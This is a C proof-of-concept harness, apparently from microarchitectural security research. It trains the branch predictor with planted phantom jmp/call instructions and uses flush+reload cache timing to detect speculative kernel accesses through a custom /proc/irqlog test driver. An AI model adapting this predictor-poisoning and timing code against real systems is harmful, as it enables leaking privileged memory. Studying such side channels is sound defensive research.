#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <time.h>
#include <sched.h>
#include <errno.h>
#include <sys/mman.h>
#include <inttypes.h>
#include <signal.h>
#include <setjmp.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>

#define ROUNDS 100000

#define PTRN 0xffff800800000000

uint64_t training_jmp;
uint64_t training_call;
uint64_t victim_phantom_call;

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t lo, hi;
    asm volatile ("CPUID\n\t"
            "RDTSC\n\t"
            "movq %%rdx, %0\n\t"
            "movq %%rax, %1\n\t" : "=r" (hi), "=r" (lo)::
            "%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
    uint64_t lo, hi;
    asm volatile("RDTSCP\n\t"
            "movq %%rdx, %0\n\t"
            "movq %%rax, %1\n\t"
            "CPUID\n\t": "=r" (hi), "=r" (lo):: "%rax",
            "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t reload(unsigned long offset){
    __asm__ volatile("mfence\n");
    unsigned volatile char *p = (uint8_t *)offset;
    uint64_t t0 = rdtsc();
    *(volatile unsigned char *)p;
    uint64_t dt = rdtscp() - t0;
    return dt;
}

int compare(const void *a, const void *b) {
    uint64_t ua = *(const uint64_t *)a;
    uint64_t ub = *(const uint64_t *)b;
    return (ua > ub) - (ua < ub);
}

static inline __attribute__((always_inline)) void flush_range(long start, long stride, int n) {
    for (uint64_t k = 0; k < n; ++k) {
        volatile void *p = (uint8_t *)start + k * stride;
        __asm__ volatile("clflushopt (%0)\n"::"r"(p));
        __asm__ volatile("clflushopt (%0)\n"::"r"(p));
    }
}

void set_training_addrs(uint64_t jmp_loc, uint64_t call_loc){
    training_jmp = jmp_loc ^ PTRN;
    training_call = call_loc ^ PTRN;
    victim_phantom_call = call_loc;

    mmap((void *)(training_jmp & ~0xfff), 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);
    mmap((void *)(training_call & ~0xfff), 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);

    *(uint32_t *)training_jmp = 0x00e0ff41; //jmp *%r8
    *(uint32_t *)training_call = 0x00d0ff41; //call *%r8
}

void unset_training_addrs(){
    munmap((void *)(training_jmp & ~0xfff), 8192);
    munmap((void *)(training_call & ~0xfff), 8192);
}

static inline void insert_p_jmp(){
    asm(
        "pushq $2f\n\t"
        "movq %[br_src], %%rcx\n\t"
        "mov %0, %%r8\n\t"
        "call 1f\n\t"
        "jmp *%%rcx\n\t"
        "1:\n\t"
        "popq %%rax\n\t"
        "clflush (%%rsp)\n\t"
        "ret\n\t"
        "2:\n\t"
        :: "r"(victim_phantom_call), [br_src]"r"(training_jmp): "r8", "rax", "rbx", "rdx", "rcx", "rsi", "rdi", "r9", "r10", "r11", "r14", "r15"
    );
}

static inline void insert_p_call(){
    asm(
        "pushq $2f\n\t"
        "movq %[br_src], %%rcx\n\t"
        "mov %0, %%r8\n\t"
        "call 1f\n\t"
        "jmp *%%rcx\n\t"
        "1:\n\t"
        "popq %%rax\n\t"
        "clflush (%%rsp)\n\t"
        "ret\n\t"
        "2:\n\t"
        :: "r"(victim_phantom_call), [br_src]"r"(training_call): "r8", "rax", "rbx", "rdx", "rcx", "rsi", "rdi", "r9", "r10", "r11", "r14", "r15"
    );
}

int main() {	
    printf("%d\n", getpid());
    fflush(stdout);

    int fd = open("/proc/irqlog", O_RDONLY);

    uint64_t base = (uint64_t)aligned_alloc(4096, 4096);
    *(volatile char *)base = 0x0;

    uint64_t base_copy = base;
    int ret = ioctl(fd, 1002, &base_copy);
    printf("ioctl = %d (%p)\n", ret, (void *)base_copy);
    fflush(stdout);

#if defined(AMD)
    set_training_addrs(TRAINING_INTERRUPT, GADGET_ADDR);
#endif

    int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
    if (tfd < 0) {
        perror("timerfd_create");
        exit(1);
    }

    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    struct itimerspec ts = {0};
    ts.it_value = now;

    ts.it_interval.tv_nsec = INTERVAL;
    timerfd_settime(tfd, TFD_TIMER_ABSTIME, &ts, NULL);

    uint64_t cycles[ROUNDS];
    
#ifdef INTEL
    for(int r = 0; r < ROUNDS; r++){
        uint64_t offset = r % 3 != 0 ? 0 : 64;
        int ret;
        uint64_t exp;

        //Read
        asm volatile(
            "syscall"
            : "=a"(ret)
            : "a"(0),
            "D"(tfd),
            "S"(&exp),
            "d"(8)
            : "rcx","r11","r10","r8","r9","memory", "r12", "r13", "r14"
        );  
#ifdef SPINNING
        for(volatile uint64_t b = 0; b < SPINNING; b++){}
#endif

        flush_range(base + offset, 0, 1);

        //0x0 == training, > 0x0 == consume
        for(int i = 0; i < 2; i++) ioctl(fd, 0x1234, &offset);

        cycles[r] = r % 3 == 0 ? reload(base + offset) : 10000;
    }
#elif defined(AMD)
    uint64_t offset = 0;
    for(int r = 0; r < ROUNDS; r++){
        int ret;
        uint64_t exp;

        //Read
        asm volatile(
            "syscall"
            : "=a"(ret)
            : "a"(0),
            "D"(tfd),
            "S"(&exp),
            "d"(8)
            : "rcx","r11","r10","r8","r9","memory", "r12", "r13", "r14"
        );  
#ifdef SPINNING
        for(volatile uint64_t b = 0; b < SPINNING; b++){}
#endif

        insert_p_call();
        insert_p_jmp();

        flush_range(base + offset, 0, 1);

        //0x0 == training, > 0x0 == consume
        for(int i = 0; i < 10; i++) ioctl(fd, 0x1234, &offset);

        cycles[r] = reload(base + offset);
    }
#endif

    qsort(cycles, ROUNDS, sizeof(uint64_t), compare);

    int hits = 0;
    for(int i = 0; i < ROUNDS; i++){
    	if(cycles[i] < 100) hits++;
    }

    printf("Lowest = %lu (hits = %d)\n", cycles[0], hits);

    return 0;
}
